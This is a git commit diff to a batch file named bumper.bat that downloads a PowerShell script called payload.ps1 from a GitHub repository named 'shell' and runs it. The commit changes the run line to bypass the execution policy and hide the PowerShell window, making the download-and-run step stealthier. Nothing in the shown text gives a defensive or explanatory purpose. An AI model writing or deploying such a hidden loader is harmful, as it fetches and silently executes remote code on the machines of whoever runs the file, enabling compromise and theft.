55df2718ede6638acfe344f9580c5410295fccc9
Mood56467 <100055549+Mood56467@users.noreply.github.com>
2024-03-04 17:18:47 -0800

    bumper.bat

--- bumper.bat
+++ bumper.bat
@@ -1,2 +1,2 @@
 curl https://raw.githubusercontent.com/Mood56467/shell/main/payload.ps1 -o payload.ps1
-powershell ./payload.ps1
+powershell  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ./payload.ps1
